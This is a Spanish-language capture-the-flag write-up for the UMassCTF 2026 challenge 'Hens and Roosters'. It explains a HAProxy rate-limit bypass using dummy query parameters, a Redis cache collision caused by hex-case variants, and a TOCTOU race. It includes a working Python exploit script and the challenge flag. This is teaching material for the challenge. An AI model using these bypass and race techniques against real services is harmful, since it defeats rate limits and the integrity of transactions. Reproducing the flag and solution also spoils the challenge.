# Hens and Roosters

| Campo       | Valor                          |
|-------------|--------------------------------|
| Plataforma  | UMassCTF 2026                  |
| Categoría   | crypto / web                   |
| Dificultad  | Medium                         |
| Puntos      | 352                            |
| Solves      | 62                             |

## Descripción
> Please help me buy more Legos! The store has such aggressive rate limiting I can't even get an ID!

## TL;DR
Race condition en Redis + bypass de rate limit en HAProxy. Las firmas UOV se cachean por su string hex en Redis, pero `bytes.fromhex()` es case-insensitive. Enviando variantes de case concurrentemente con query params unicos para bypass del rate limit, cada variante incrementa studs independientemente.

## Analisis inicial

Estructura:
- `backend/app.py` -- Flask app con endpoints `/`, `/buy`, `/work`
- `backend/uov.py` -- UOV (Unbalanced Oil and Vinegar) sobre GF(2^7)
- `proxy/haproxy.cfg` -- HAProxy con rate limiting agresivo (1 req/20s por URL)

Flujo del juego:
1. `GET /` -> genera UID, almacena con 0 studs
2. `GET /buy?uid=X` -> studs==0: da firma gratuita; studs>=7: da flag
3. `POST /work` -> verifica firma, incrementa studs. Firmas gratuitas solo hasta studs=2

Objetivo: 7 studs. Solo obtenemos firmas gratis hasta studs=2.

## Vulnerabilidades

### 1. HAProxy rate limit bypass (CWE-284)
Rate limit trackea por URL completa. `/work?_=1` y `/work?_=2` son URLs diferentes con buckets separados. Flask ignora query params extra.

### 2. Redis hex case collision (CWE-178)
Firmas cacheadas por hex STRING en Redis. `bytes.fromhex("ab") == bytes.fromhex("AB")` pero son keys Redis distintas. Cada variante se verifica independientemente.

### 3. TOCTOU race (CWE-362)
Todos los threads leen studs=0 antes de cualquier incremento. La verificacion sage tarda ~50ms, dando ventana amplia.

## Exploit

```python
# 1. Get UID + free sig for "0|uid"
r = requests.get(f"{BASE}/?t=1")
uid = r.text.split("uid is ")[1].strip().rstrip("!")
r = requests.get(f"{BASE}/buy?uid={uid}&t=1")
sig = r.text.split("free signature: ")[1].strip()

# 2. Generate case variants (same bytes, different Redis keys)
letter_positions = [i for i, c in enumerate(sig) if c in 'abcdef']
variants = []
for mask in range(10):
    chars = list(sig)
    for i, pos in enumerate(letter_positions[:5]):
        if mask & (1 << i):
            chars[pos] = chars[pos].upper()
    variants.append(''.join(chars))

# 3. Send ALL concurrently with unique query params
with ThreadPoolExecutor(max_workers=10) as ex:
    futures = [ex.submit(lambda i,v: requests.post(
        f"{BASE}/work?_={i}", json={"uid": uid, "sig": v}
    ), i, variants[i]) for i in range(10)]

# 4. All threads read studs=0, verify same sig (different case), each increments
# studs goes 0 -> 10

# 5. Get flag
r = requests.get(f"{BASE}/buy?uid={uid}&t=2")
# UMASS{oil_does_mix_with_oil_but_roosters_dont}
```

## Flag
```
UMASS{oil_does_mix_with_oil_but_roosters_dont}
```

## Key Lessons
- No toda vuln en reto "crypto" es criptografica -- aqui la vuln es web/race condition
- HAProxy rate limit por URL se bypasea con query params dummy
- `bytes.fromhex()` case-insensitive vs string comparison case-sensitive = CWE-178
- TOCTOU: operacion lenta (sage verify) entre lectura de estado y escritura crea ventana de race
